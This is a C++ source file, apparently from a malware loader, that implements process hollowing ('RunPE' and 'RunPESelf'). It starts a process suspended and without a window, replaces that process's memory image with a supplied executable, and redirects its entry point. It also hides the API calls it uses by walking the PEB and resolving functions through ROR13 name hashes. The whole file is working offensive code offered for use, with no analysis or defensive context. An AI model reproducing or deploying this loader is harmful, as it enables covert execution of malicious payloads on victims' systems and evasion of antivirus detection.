

int	Inject::RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
{
	HMODULE(WINAPI * pLoadLibraryA)(LPCSTR lpLibFileName) = 0;
	VOID(WINAPI * pExitProcess)(UINT uExitCode) = 0;
	DWORD(WINAPI * pGetModuleFileNameW)(__in_opt HMODULE hModule, __out_ecount_part(nSize, return +1) LPWSTR lpFilename, __in DWORD nSize) = 0;
	BOOL(WINAPI * pCreateProcessW) (__in_opt    LPCWSTR lpApplicationName, __inout_opt LPWSTR lpCommandLine, __in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes, __in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes, __in        BOOL bInheritHandles, __in        DWORD dwCreationFlags, __in_opt    LPVOID lpEnvironment, __in_opt    LPCWSTR lpCurrentDirectory, __in        LPSTARTUPINFOW lpStartupInfo, __out       LPPROCESS_INFORMATION lpProcessInformation);
	BOOL(WINAPI * pGetThreadContext) (__in    HANDLE hThread, __inout LPCONTEXT lpContext);
	NTSTATUS(NTAPI * pNtUnmapViewOfSection)(HANDLE ProcessHandle, LPVOID BaseAddress);
	HMODULE(WINAPI * pGetModuleHandleW)(__in_opt LPCWSTR lpModuleName);
	LPVOID(WINAPI * pVirtualAllocEx)(__in     HANDLE hProcess, __in_opt LPVOID lpAddress, __in     SIZE_T dwSize, __in     DWORD flAllocationType, __in     DWORD flProtect);
	BOOL(WINAPI * pWriteProcessMemory)(__in      HANDLE hProcess, __in      LPVOID lpBaseAddress, __in_bcount(nSize) LPCVOID lpBuffer, __in      SIZE_T nSize, __out_opt SIZE_T * lpNumberOfBytesWritten);
	NTSTATUS(NTAPI * pNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
	BOOL(WINAPI * pSetThreadContext)(__in HANDLE hThread, __in CONST CONTEXT *lpContext);
	DWORD(WINAPI * pResumeThread)(__in HANDLE hThread);
	BOOL(WINAPI * pCloseHandle)(__in HANDLE hObject);
	BOOL(WINAPI * pVirtualFree)(__in LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD dwFreeType);
	BOOL(WINAPI *  pTerminateProcess)(__in HANDLE hProcess, __in UINT uExitCode);
	LPWSTR(WINAPI * pGetCommandLineW)(VOID);
	LPVOID(WINAPI * pVirtualAlloc)(__in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect);
	//void * (__cdecl * memset)(_Out_writes_bytes_all_(_Size) void * _Dst, _In_ int _Val, _In_ size_t _Size);

	DWORD_PTR hKernel32 = get_kernel32base();
	DWORD_PTR hNtdll = get_ntdllbase();

	*(DWORD_PTR*)&pLoadLibraryA = get_proc_address(hKernel32, 0x8a8b4676);
	*(DWORD_PTR*)&pExitProcess = get_proc_address(hKernel32, 0x12dfcc4e);
	*(DWORD_PTR*)&pGetModuleFileNameW = get_proc_address(hKernel32, 0xf3cf5f6f);
	*(DWORD_PTR*)&pCreateProcessW = get_proc_address(hKernel32, 0xb4f0f46f);
	*(DWORD_PTR*)&pGetThreadContext = get_proc_address(hKernel32, 0xf7643b99);
	*(DWORD_PTR*)&pNtUnmapViewOfSection = get_proc_address(hNtdll, 0x98acab94);
	*(DWORD_PTR*)&pGetModuleHandleW = get_proc_address(hKernel32, 0x61eebd02);
	*(DWORD_PTR*)&pVirtualAllocEx = get_proc_address(hKernel32, 0x0dd78764);
	*(DWORD_PTR*)&pWriteProcessMemory = get_proc_address(hKernel32, 0x6659de75);
	*(DWORD_PTR*)&pNtQueryInformationProcess = get_proc_address(hNtdll, 0x339c09fb);
	*(DWORD_PTR*)&pSetThreadContext = get_proc_address(hKernel32, 0x77643b9b);
	*(DWORD_PTR*)&pResumeThread = get_proc_address(hKernel32, 0x3cc73360);
	*(DWORD_PTR*)&pCloseHandle = get_proc_address(hKernel32, 0xae7a8bda);
	*(DWORD_PTR*)&pVirtualFree = get_proc_address(hKernel32, 0xe183277b);
	*(DWORD_PTR*)&pTerminateProcess = get_proc_address(hKernel32, 0x07722b4b);
	*(DWORD_PTR*)&pGetCommandLineW = get_proc_address(hKernel32, 0xc56e656d);
	*(DWORD_PTR*)&pVirtualAlloc = get_proc_address(hKernel32, 0x302ebe1c);
	//*(DWORD_PTR*)&memset = get_proc_address(hNtdll, 0x1c2c653b);

	// ��� ������
	//int (WINAPI * pMessageBoxA)(__in_opt HWND hWnd, __in_opt LPCSTR lpText, __in_opt LPCSTR lpCaption, __in UINT uType);
	//char ccc[11];
	//ccc[0] = 'u'; ccc[1] = 's'; ccc[2] = 'e'; ccc[3] = 'r'; ccc[4] = '3'; ccc[5] = '2'; ccc[6] = '.'; ccc[7] = 'd'; ccc[8] = 'l'; ccc[9] = 'l'; ccc[10] = 0;
	//DWORD_PTR hUserdll = (DWORD_PTR)pLoadLibraryA(ccc);
	//*(DWORD_PTR*)&pMessageBoxA = get_proc_address(hUserdll, 0x9aca9698);


	PROCESS_INFORMATION PI;
	memset(&PI, 0, sizeof(PROCESS_INFORMATION));
	STARTUPINFOW SI;
	memset(&SI, 0, sizeof(STARTUPINFO));
	CONTEXT CTX;
	memset(&CTX, 0, sizeof(CONTEXT));
	PROCESS_BASIC_INFORMATION PBI;
	memset(&PBI, 0, sizeof(PROCESS_BASIC_INFORMATION));

	CTX.ContextFlags = ((0x00010000 | 0x00000001L) | (0x00010000 | 0x00000002L) | (0x00010000 | 0x00000004L));
	wchar_t* wPath;
	LPVOID lpImageBase;
	ULONG RetSize;
	DWORD pid;
	PIMAGE_DOS_HEADER IDH = (PIMAGE_DOS_HEADER)lpFile;
#ifndef WIN64
	PIMAGE_NT_HEADERS INH = (PIMAGE_NT_HEADERS)((DWORD)lpFile + IDH->e_lfanew);
#else
	PIMAGE_NT_HEADERS INH = (PIMAGE_NT_HEADERS)((DWORD64)lpFile + IDH->e_lfanew);
#endif
	PIMAGE_SECTION_HEADER ISH = ((PIMAGE_SECTION_HEADER)((ULONG_PTR)(INH)+((LONG)(LONG_PTR)&(((IMAGE_NT_HEADERS *)0)->OptionalHeader)) + ((INH))->FileHeader.SizeOfOptionalHeader));
	wPath = (PWCHAR)pVirtualAlloc(NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(wPath, 0, sizeof(MAX_PATH));
	//if (!pGetModuleFileNameW(NULL, wPath, MAX_PATH - 1)) return 0;
	wPath = path;
#ifndef Debug
	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
#else
	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
#endif
		//if(CreateProcess("C:\\Windows\\System32\\attrib.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Start the target application
	{
		pid = Kernel32::pGetProcessId(PI.hProcess);
		if (pGetThreadContext(PI.hThread, &CTX))
		{
			if (pNtUnmapViewOfSection(PI.hProcess, pGetModuleHandleW(NULL)))
			{
				if (lpImageBase = pVirtualAllocEx(PI.hProcess, (LPVOID)INH->OptionalHeader.ImageBase, INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
				{
					if (pWriteProcessMemory(PI.hProcess, lpImageBase, lpFile, INH->OptionalHeader.SizeOfHeaders, NULL))
					{
						for (int iSection = 0; iSection < INH->FileHeader.NumberOfSections; iSection++)
						{
#ifndef WIN64
							pWriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)lpImageBase + ISH[iSection].VirtualAddress), (LPVOID)((DWORD)lpFile + ISH[iSection].PointerToRawData), ISH[iSection].SizeOfRawData, NULL);
#else
							pWriteProcessMemory(PI.hProcess, LPVOID(DWORD64(lpImageBase) + ISH[iSection].VirtualAddress), LPVOID(DWORD64(lpFile) + ISH[iSection].PointerToRawData), ISH[iSection].SizeOfRawData, NULL);
#endif
						}
						if (!pNtQueryInformationProcess(PI.hProcess, (PROCESSINFOCLASS)0, &PBI, sizeof(PBI), &RetSize))
						{
#ifndef WIN64
							if (pWriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)PBI.PebBaseAddress + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
#else
							if (pWriteProcessMemory(PI.hProcess, LPVOID(DWORD64(PBI.PebBaseAddress) + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
#endif
							{
#ifndef WIN64
								CTX.Eax = (DWORD)lpImageBase + INH->OptionalHeader.AddressOfEntryPoint;
#else
								CTX.Rcx = (DWORD64)lpImageBase + INH->OptionalHeader.AddressOfEntryPoint;
#endif
								if (pSetThreadContext(PI.hThread, &CTX))
								{
									if (pResumeThread(PI.hThread))
									{
										//ccc[0] = '2'; ccc[1] = '2'; ccc[2] = '2'; ccc[3] = 0;
										//pMessageBoxA(0, ccc, ccc, 0);
										pCloseHandle(PI.hProcess);
										pCloseHandle(PI.hThread);
										//pExitProcess(0);
										return pid;


									}

								}

							}

						}

					}


				}


			}
		}

	}

	if (PI.hProcess)
	{
		//	cout << "PI.hProcess)" << endl;
		pTerminateProcess(PI.hProcess, 0);
		pCloseHandle(PI.hProcess);
		return -1;
	}
	//if (PI.hThread) pCloseHandle(PI.hThread);
	//pExitProcess(0);
	return -1;
}

int	Inject::RunPESelf(void* lpFile, DWORD szFile, LPWSTR args)
{
	HMODULE(WINAPI * pLoadLibraryA)(LPCSTR lpLibFileName) = 0;
	VOID(WINAPI * pExitProcess)(UINT uExitCode) = 0;
	DWORD(WINAPI * pGetModuleFileNameW)(__in_opt HMODULE hModule, __out_ecount_part(nSize, return +1) LPWSTR lpFilename, __in DWORD nSize) = 0;
	BOOL(WINAPI * pCreateProcessW) (__in_opt    LPCWSTR lpApplicationName, __inout_opt LPWSTR lpCommandLine, __in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes, __in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes, __in        BOOL bInheritHandles, __in        DWORD dwCreationFlags, __in_opt    LPVOID lpEnvironment, __in_opt    LPCWSTR lpCurrentDirectory, __in        LPSTARTUPINFOW lpStartupInfo, __out       LPPROCESS_INFORMATION lpProcessInformation);
	BOOL(WINAPI * pGetThreadContext) (__in    HANDLE hThread, __inout LPCONTEXT lpContext);
	NTSTATUS(NTAPI * pNtUnmapViewOfSection)(HANDLE ProcessHandle, LPVOID BaseAddress);
	HMODULE(WINAPI * pGetModuleHandleW)(__in_opt LPCWSTR lpModuleName);
	LPVOID(WINAPI * pVirtualAllocEx)(__in     HANDLE hProcess, __in_opt LPVOID lpAddress, __in     SIZE_T dwSize, __in     DWORD flAllocationType, __in     DWORD flProtect);
	BOOL(WINAPI * pWriteProcessMemory)(__in      HANDLE hProcess, __in      LPVOID lpBaseAddress, __in_bcount(nSize) LPCVOID lpBuffer, __in      SIZE_T nSize, __out_opt SIZE_T * lpNumberOfBytesWritten);
	NTSTATUS(NTAPI * pNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
	BOOL(WINAPI * pSetThreadContext)(__in HANDLE hThread, __in CONST CONTEXT *lpContext);
	DWORD(WINAPI * pResumeThread)(__in HANDLE hThread);
	BOOL(WINAPI * pCloseHandle)(__in HANDLE hObject);
	BOOL(WINAPI * pVirtualFree)(__in LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD dwFreeType);
	BOOL(WINAPI *  pTerminateProcess)(__in HANDLE hProcess, __in UINT uExitCode);
	LPWSTR(WINAPI * pGetCommandLineW)(VOID);
	LPVOID(WINAPI * pVirtualAlloc)(__in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect);
	//void * (__cdecl * memset)(_Out_writes_bytes_all_(_Size) void * _Dst, _In_ int _Val, _In_ size_t _Size);

	DWORD_PTR hKernel32 = get_kernel32base();
	DWORD_PTR hNtdll = get_ntdllbase();

	*(DWORD_PTR*)&pLoadLibraryA = get_proc_address(hKernel32, 0x8a8b4676);
	*(DWORD_PTR*)&pExitProcess = get_proc_address(hKernel32, 0x12dfcc4e);
	*(DWORD_PTR*)&pGetModuleFileNameW = get_proc_address(hKernel32, 0xf3cf5f6f);
	*(DWORD_PTR*)&pCreateProcessW = get_proc_address(hKernel32, 0xb4f0f46f);
	*(DWORD_PTR*)&pGetThreadContext = get_proc_address(hKernel32, 0xf7643b99);
	*(DWORD_PTR*)&pNtUnmapViewOfSection = get_proc_address(hNtdll, 0x98acab94);
	*(DWORD_PTR*)&pGetModuleHandleW = get_proc_address(hKernel32, 0x61eebd02);
	*(DWORD_PTR*)&pVirtualAllocEx = get_proc_address(hKernel32, 0x0dd78764);
	*(DWORD_PTR*)&pWriteProcessMemory = get_proc_address(hKernel32, 0x6659de75);
	*(DWORD_PTR*)&pNtQueryInformationProcess = get_proc_address(hNtdll, 0x339c09fb);
	*(DWORD_PTR*)&pSetThreadContext = get_proc_address(hKernel32, 0x77643b9b);
	*(DWORD_PTR*)&pResumeThread = get_proc_address(hKernel32, 0x3cc73360);
	*(DWORD_PTR*)&pCloseHandle = get_proc_address(hKernel32, 0xae7a8bda);
	*(DWORD_PTR*)&pVirtualFree = get_proc_address(hKernel32, 0xe183277b);
	*(DWORD_PTR*)&pTerminateProcess = get_proc_address(hKernel32, 0x07722b4b);
	*(DWORD_PTR*)&pGetCommandLineW = get_proc_address(hKernel32, 0xc56e656d);
	*(DWORD_PTR*)&pVirtualAlloc = get_proc_address(hKernel32, 0x302ebe1c);
	//*(DWORD_PTR*)&memset = get_proc_address(hNtdll, 0x1c2c653b);

	// ��� ������
	//int (WINAPI * pMessageBoxA)(__in_opt HWND hWnd, __in_opt LPCSTR lpText, __in_opt LPCSTR lpCaption, __in UINT uType);
	//char ccc[11];
	//ccc[0] = 'u'; ccc[1] = 's'; ccc[2] = 'e'; ccc[3] = 'r'; ccc[4] = '3'; ccc[5] = '2'; ccc[6] = '.'; ccc[7] = 'd'; ccc[8] = 'l'; ccc[9] = 'l'; ccc[10] = 0;
	//DWORD_PTR hUserdll = (DWORD_PTR)p
	
	//A(ccc);
	//*(DWORD_PTR*)&pMessageBoxA = get_proc_address(hUserdll, 0x9aca9698);


	PROCESS_INFORMATION PI;
	memset(&PI, 0, sizeof(PROCESS_INFORMATION));
	STARTUPINFOW SI;
	memset(&SI, 0, sizeof(STARTUPINFO));
	CONTEXT CTX;
	memset(&CTX, 0, sizeof(CONTEXT));
	PROCESS_BASIC_INFORMATION PBI;
	memset(&PBI, 0, sizeof(PROCESS_BASIC_INFORMATION));

	CTX.ContextFlags = ((0x00010000 | 0x00000001L) | (0x00010000 | 0x00000002L) | (0x00010000 | 0x00000004L));
	PWCHAR wPath;
	LPVOID lpImageBase;
	DWORD pid;
	ULONG RetSize;
	PIMAGE_DOS_HEADER IDH = (PIMAGE_DOS_HEADER)lpFile;
#ifndef WIN64
	PIMAGE_NT_HEADERS INH = (PIMAGE_NT_HEADERS)((DWORD)lpFile + IDH->e_lfanew);
#else
	PIMAGE_NT_HEADERS INH = (PIMAGE_NT_HEADERS)((DWORD64)lpFile + IDH->e_lfanew);
#endif
	PIMAGE_SECTION_HEADER ISH = ((PIMAGE_SECTION_HEADER)((ULONG_PTR)(INH)+((LONG)(LONG_PTR)&(((IMAGE_NT_HEADERS *)0)->OptionalHeader)) + ((INH))->FileHeader.SizeOfOptionalHeader));
	wPath = (PWCHAR)pVirtualAlloc(NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(wPath, 0, sizeof(MAX_PATH));
	if (!pGetModuleFileNameW(NULL, wPath, MAX_PATH - 1)) return 0;
	//wPath = path;
#ifndef Debug
	if (pCreateProcessW(wPath, args, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
#else
	if (pCreateProcessW(wPath, args, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
#endif
		//if(CreateProcess("C:\\Windows\\System32\\attrib.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Start the target application
	{
		pid = Kernel32::pGetProcessId(PI.hProcess);
		//cout << pid << endl;

		if (pGetThreadContext(PI.hThread, &CTX))
		{
			if (!pNtUnmapViewOfSection(PI.hProcess, pGetModuleHandleW(NULL)))
			{
				if (lpImageBase = pVirtualAllocEx(PI.hProcess, (LPVOID)INH->OptionalHeader.ImageBase, INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
				{
					if (pWriteProcessMemory(PI.hProcess, lpImageBase, lpFile, INH->OptionalHeader.SizeOfHeaders, NULL))
					{
						for (int iSection = 0; iSection < INH->FileHeader.NumberOfSections; iSection++)
						{
#ifndef WIN64
							pWriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)lpImageBase + ISH[iSection].VirtualAddress), (LPVOID)((DWORD)lpFile + ISH[iSection].PointerToRawData), ISH[iSection].SizeOfRawData, NULL);
#else
							pWriteProcessMemory(PI.hProcess, LPVOID(DWORD64(lpImageBase) + ISH[iSection].VirtualAddress), LPVOID(DWORD64(lpFile) + ISH[iSection].PointerToRawData), ISH[iSection].SizeOfRawData, NULL);
#endif
						}
						if (!pNtQueryInformationProcess(PI.hProcess, (PROCESSINFOCLASS)0, &PBI, sizeof(PBI), &RetSize))
						{
#ifndef WIN64
							if (pWriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)PBI.PebBaseAddress + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
#else
							if (pWriteProcessMemory(PI.hProcess, LPVOID(DWORD64(PBI.PebBaseAddress) + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
#endif
							{
#ifndef WIN64
								CTX.Eax = (DWORD)lpImageBase + INH->OptionalHeader.AddressOfEntryPoint;
#else
								CTX.Rcx = (DWORD64)lpImageBase + INH->OptionalHeader.AddressOfEntryPoint;
#endif
								if (pSetThreadContext(PI.hThread, &CTX))
								{
									if (pResumeThread(PI.hThread))
									{
										//	cout << "Resume" << endl;
										//ccc[0] = '2'; ccc[1] = '2'; ccc[2] = '2'; ccc[3] = 0;
										//pMessageBoxA(0, ccc, ccc, 0);
										pCloseHandle(PI.hProcess);
										pCloseHandle(PI.hThread);
										//pExitProcess(0);

										return pid;


									}

								}

							}

						}

					}


				}


			}
		}

	}

	if (PI.hProcess)
	{
		pTerminateProcess(PI.hProcess, 0);
		pCloseHandle(PI.hProcess);
		return -1;
	}
	//if (PI.hThread) pCloseHandle(PI.hThread);
	//pExitProcess(0);
	return -1;
}

// ��������� ����� PEB ������ kernel32.dll
DWORD_PTR Inject::get_kernel32base()
{
	void *vp;
#ifndef WIN64
	PPEB peb = (PPEB)__readfsdword(0x30);
	DWORD test = (DWORD)peb->Ldr->InMemoryOrderModuleList.Flink[0].Flink->Flink + 0x10;
	vp = *(void **)test;
#else
	PPEB peb = (PPEB)__readgsqword(0x60);
	DWORD64 test = (DWORD64)peb->Ldr->InMemoryOrderModuleList.Flink[0].Flink->Flink + 0x20;
	vp = *(void **)test;
#endif
	return (DWORD_PTR)vp;
}

// ��������� ����� PEB ������ ntdll.dll
DWORD_PTR Inject::get_ntdllbase()
{
	void *vp;
#ifndef WIN64
	PPEB peb = (PPEB)__readfsdword(0x30);
	DWORD test = (DWORD)peb->Ldr->InMemoryOrderModuleList.Flink[0].Flink + 0x10;
	vp = *(void **)test;
#else
	PPEB peb = (PPEB)__readgsqword(0x60);
	DWORD64 test = (DWORD64)peb->Ldr->InMemoryOrderModuleList.Flink[0].Flink + 0x20;
	vp = *(void **)test;
#endif
	return (DWORD_PTR)vp;
}

// ��������� ����
DWORD Inject::get_hash(const char *str) {
	DWORD h;
	h = 0;
	while (*str) {
		h = (h >> 13) | (h << (32 - 13));       // ROR h, 13
		h += *str >= 'a' ? *str - 32 : *str;    // ������������ ������� � ������� �������
		str++;
	}
	return h;
}

// ��������� ������ ������� � ���
DWORD_PTR Inject::get_proc_address(DWORD_PTR pDLL, DWORD dwAPI)
{
	IMAGE_DOS_HEADER* pIDH = (IMAGE_DOS_HEADER*)pDLL;
	IMAGE_NT_HEADERS* pINH = (IMAGE_NT_HEADERS*)((BYTE*)pDLL + pIDH->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* pIED = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)pDLL + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* dwNames = (DWORD*)((BYTE*)pDLL + pIED->AddressOfNames);
	DWORD* dwFunctions = (DWORD*)((BYTE*)pDLL + pIED->AddressOfFunctions);
	WORD* wNameOrdinals = (WORD*)((BYTE*)pDLL + pIED->AddressOfNameOrdinals);
	for (DWORD i = 0; i < pIED->NumberOfNames; i++)
	{
		if (get_hash((char*)((BYTE*)pDLL + dwNames[i])) == dwAPI)
		{
			return (DWORD_PTR)((BYTE*)pDLL + dwFunctions[wNameOrdinals[i]]);
		}
	}

	return 0;
}